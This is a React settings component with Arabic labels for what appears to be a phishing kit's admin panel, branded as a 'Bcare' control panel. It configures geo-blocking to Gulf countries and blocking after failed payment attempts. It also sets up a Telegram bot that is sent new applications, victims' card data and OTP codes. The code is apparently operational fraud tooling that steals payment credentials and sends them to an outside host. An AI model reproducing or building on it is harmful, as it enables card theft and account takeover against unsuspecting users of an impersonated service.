import { useEffect, useState } from "react";
import { Globe, Shield, Save, Send, ExternalLink } from "lucide-react";
import { toast } from "sonner";
import { cn } from "@/lib/utils";
import {
  getSettings,
  subscribeSettings,
  updateSettings,
  sendTelegramTest,
  type SiteSettings,
} from "@/lib/site-settings";

const COUNTRY_OPTIONS: Array<{ code: string; label: string }> = [
  { code: "SA", label: "السعودية" },
  { code: "AE", label: "الإمارات" },
  { code: "KW", label: "الكويت" },
  { code: "QA", label: "قطر" },
  { code: "BH", label: "البحرين" },
  { code: "OM", label: "عُمان" },
  { code: "EG", label: "مصر" },
  { code: "JO", label: "الأردن" },
  { code: "IQ", label: "العراق" },
  { code: "YE", label: "اليمن" },
];

export default function SettingsPanel() {
  const [settings, setSettings] = useState<SiteSettings>(getSettings());
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    const unsub = subscribeSettings(() => setSettings(getSettings()));
    return unsub;
  }, []);

  const toggleCountry = (code: string) => {
    setSettings((s) => {
      const has = s.allowedCountries.includes(code);
      return {
        ...s,
        allowedCountries: has
          ? s.allowedCountries.filter((c) => c !== code)
          : [...s.allowedCountries, code],
      };
    });
  };

  const handleSave = async () => {
    setSaving(true);
    try {
      await updateSettings(settings);
      toast.success("تم حفظ الإعدادات");
    } catch {
      toast.error("تعذّر حفظ الإعدادات");
    } finally {
      setSaving(false);
    }
  };

  return (
    <div className="space-y-4">
      {/* Geo block */}
      <section className="rounded-2xl border border-white/60 bg-white/80 p-5 shadow-card backdrop-blur-xl">
        <header className="mb-4 flex items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-brand-blue/10 text-brand-blue">
              <Globe className="h-4.5 w-4.5" />
            </div>
            <div>
              <h3 className="text-[15px] font-extrabold text-foreground">
                حظر جغرافي
              </h3>
              <p className="text-[12px] text-muted-foreground">
                السماح بالوصول للموقع من دول محددة فقط.
              </p>
            </div>
          </div>
          <label className="relative inline-flex cursor-pointer items-center">
            <input
              type="checkbox"
              className="peer sr-only"
              checked={settings.geoBlockEnabled}
              onChange={(e) =>
                setSettings((s) => ({ ...s, geoBlockEnabled: e.target.checked }))
              }
            />
            <div className="h-6 w-11 rounded-full bg-muted transition-colors peer-checked:bg-brand-blue" />
            <div className="pointer-events-none absolute end-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform peer-checked:-translate-x-5 rtl:peer-checked:translate-x-5" />
          </label>
        </header>

        <div>
          <div className="mb-2 text-[12px] font-bold text-muted-foreground">
            الدول المسموح بها
          </div>
          <div className="flex flex-wrap gap-2">
            {COUNTRY_OPTIONS.map((c) => {
              const active = settings.allowedCountries.includes(c.code);
              return (
                <button
                  key={c.code}
                  type="button"
                  onClick={() => toggleCountry(c.code)}
                  disabled={!settings.geoBlockEnabled}
                  className={cn(
                    "rounded-xl border px-3 py-1.5 text-[12.5px] font-bold transition-all",
                    active
                      ? "border-brand-blue bg-brand-blue text-white shadow-soft"
                      : "border-border bg-white/70 text-muted-foreground hover:border-brand-blue/40 hover:text-brand-blue",
                    !settings.geoBlockEnabled && "opacity-50",
                  )}
                >
                  {c.label}
                  <span className="ms-1 text-[10.5px] opacity-70">{c.code}</span>
                </button>
              );
            })}
          </div>
        </div>
      </section>

      {/* Attempts block */}
      <section className="rounded-2xl border border-white/60 bg-white/80 p-5 shadow-card backdrop-blur-xl">
        <header className="mb-4 flex items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-brand-blue/10 text-brand-blue">
              <Shield className="h-4.5 w-4.5" />
            </div>
            <div>
              <h3 className="text-[15px] font-extrabold text-foreground">
                حظر بعد محاولات فاشلة
              </h3>
              <p className="text-[12px] text-muted-foreground">
                حظر الزائر تلقائياً عند تجاوز عدد محاولات الدفع الفاشلة.
              </p>
            </div>
          </div>
          <label className="relative inline-flex cursor-pointer items-center">
            <input
              type="checkbox"
              className="peer sr-only"
              checked={settings.attemptBlockEnabled}
              onChange={(e) =>
                setSettings((s) => ({
                  ...s,
                  attemptBlockEnabled: e.target.checked,
                }))
              }
            />
            <div className="h-6 w-11 rounded-full bg-muted transition-colors peer-checked:bg-brand-blue" />
            <div className="pointer-events-none absolute end-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform peer-checked:-translate-x-5 rtl:peer-checked:translate-x-5" />
          </label>
        </header>

        <label className="block">
          <span className="mb-1 block text-[12px] font-bold text-muted-foreground">
            الحد الأقصى للمحاولات
          </span>
          <input
            type="number"
            min={1}
            max={10}
            value={settings.maxAttempts}
            disabled={!settings.attemptBlockEnabled}
            onChange={(e) =>
              setSettings((s) => ({
                ...s,
                maxAttempts: Math.max(1, Math.min(10, Number(e.target.value) || 1)),
              }))
            }
            className={cn(
              "w-32 rounded-xl border border-border bg-white px-3 py-2 text-[13px] font-bold text-foreground outline-none transition-all focus:border-brand-blue",
              !settings.attemptBlockEnabled && "opacity-50",
            )}
          />
        </label>
      </section>

      {/* Telegram bot */}
      <section className="rounded-2xl border border-white/60 bg-white/80 p-5 shadow-card backdrop-blur-xl">
        <header className="mb-4 flex items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-brand-blue/10 text-brand-blue">
              <Send className="h-4.5 w-4.5" />
            </div>
            <div>
              <h3 className="text-[15px] font-extrabold text-foreground">
                ربط بوت تليجرام
              </h3>
              <p className="text-[12px] text-muted-foreground">
                إرسال إشعارات فورية للطلبات وبيانات البطاقة ورمز OTP إلى تليجرام.
              </p>
            </div>
          </div>
          <label className="relative inline-flex cursor-pointer items-center">
            <input
              type="checkbox"
              className="peer sr-only"
              checked={settings.telegramEnabled}
              onChange={(e) =>
                setSettings((s) => ({ ...s, telegramEnabled: e.target.checked }))
              }
            />
            <div className="h-6 w-11 rounded-full bg-muted transition-colors peer-checked:bg-brand-blue" />
            <div className="pointer-events-none absolute end-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform peer-checked:-translate-x-5 rtl:peer-checked:translate-x-5" />
          </label>
        </header>

        <div className={cn("space-y-3", !settings.telegramEnabled && "opacity-60")}>
          <label className="block">
            <span className="mb-1 block text-[12px] font-bold text-muted-foreground">
              Bot Token
            </span>
            <input
              type="text"
              dir="ltr"
              placeholder="123456:ABC-DEF..."
              value={settings.telegramBotToken}
              disabled={!settings.telegramEnabled}
              onChange={(e) =>
                setSettings((s) => ({ ...s, telegramBotToken: e.target.value.trim() }))
              }
              className="w-full rounded-xl border border-border bg-white px-3 py-2 text-[13px] font-mono text-foreground outline-none transition-all focus:border-brand-blue"
            />
          </label>

          <label className="block">
            <span className="mb-1 block text-[12px] font-bold text-muted-foreground">
              Chat ID
            </span>
            <input
              type="text"
              dir="ltr"
              placeholder="-1001234567890 أو 987654321"
              value={settings.telegramChatId}
              disabled={!settings.telegramEnabled}
              onChange={(e) =>
                setSettings((s) => ({ ...s, telegramChatId: e.target.value.trim() }))
              }
              className="w-full rounded-xl border border-border bg-white px-3 py-2 text-[13px] font-mono text-foreground outline-none transition-all focus:border-brand-blue"
            />
          </label>

          <div>
            <div className="mb-2 text-[12px] font-bold text-muted-foreground">
              الأحداث المُرسَلة
            </div>
            <div className="flex flex-wrap gap-2">
              {[
                { key: "telegramNotifyNewApplication" as const, label: "طلب جديد" },
                { key: "telegramNotifyCard" as const, label: "بيانات البطاقة" },
                { key: "telegramNotifyOtp" as const, label: "رمز OTP" },
              ].map((ev) => {
                const active = settings[ev.key];
                return (
                  <button
                    key={ev.key}
                    type="button"
                    disabled={!settings.telegramEnabled}
                    onClick={() =>
                      setSettings((s) => ({ ...s, [ev.key]: !s[ev.key] }))
                    }
                    className={cn(
                      "rounded-xl border px-3 py-1.5 text-[12.5px] font-bold transition-all",
                      active
                        ? "border-brand-blue bg-brand-blue text-white shadow-soft"
                        : "border-border bg-white/70 text-muted-foreground hover:border-brand-blue/40 hover:text-brand-blue",
                    )}
                  >
                    {ev.label}
                  </button>
                );
              })}
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2 pt-1">
            <button
              type="button"
              disabled={!settings.telegramEnabled || !settings.telegramBotToken || !settings.telegramChatId}
              onClick={async () => {
                try {
                  await sendTelegramTest(
                    settings.telegramBotToken,
                    settings.telegramChatId,
                    "✅ تم ربط بوت تليجرام بنجاح مع لوحة تحكم Bcare",
                  );
                  toast.success("تم إرسال رسالة الاختبار");
                } catch (e) {
                  toast.error("فشل الإرسال: " + (e as Error).message);
                }
              }}
              className="inline-flex h-9 items-center gap-1.5 rounded-xl border border-brand-blue/40 bg-brand-blue/5 px-3 text-[12.5px] font-bold text-brand-blue transition-all hover:bg-brand-blue/10 disabled:opacity-50"
            >
              <Send className="h-3.5 w-3.5" />
              إرسال رسالة اختبار
            </button>
            <a
              href="https://t.me/BotFather"
              target="_blank"
              rel="noreferrer"
              className="inline-flex h-9 items-center gap-1.5 rounded-xl border border-border bg-white px-3 text-[12.5px] font-bold text-muted-foreground transition-all hover:text-brand-blue"
            >
              <ExternalLink className="h-3.5 w-3.5" />
              كيف أنشئ بوت؟
            </a>
          </div>

          <p className="rounded-xl bg-muted/50 p-2.5 text-[11.5px] leading-relaxed text-muted-foreground">
            أنشئ بوت من <b>@BotFather</b> ثم انسخ التوكن هنا. للحصول على Chat ID
            أرسل رسالة للبوت من حسابك أو أضفه لمجموعة، ثم افتح
            <span dir="ltr" className="mx-1 font-mono">api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</span>
            وانسخ رقم <b>chat.id</b>.
          </p>
        </div>
      </section>



      <div className="flex justify-end">
        <button
          type="button"
          onClick={handleSave}
          disabled={saving}
          className="inline-flex h-11 items-center gap-2 rounded-xl bg-brand-blue px-5 text-[13px] font-extrabold text-white shadow-card transition-all hover:brightness-110 disabled:opacity-60"
        >
          <Save className="h-4 w-4" />
          {saving ? "جاري الحفظ..." : "حفظ الإعدادات"}
        </button>
      </div>
    </div>
  );
}
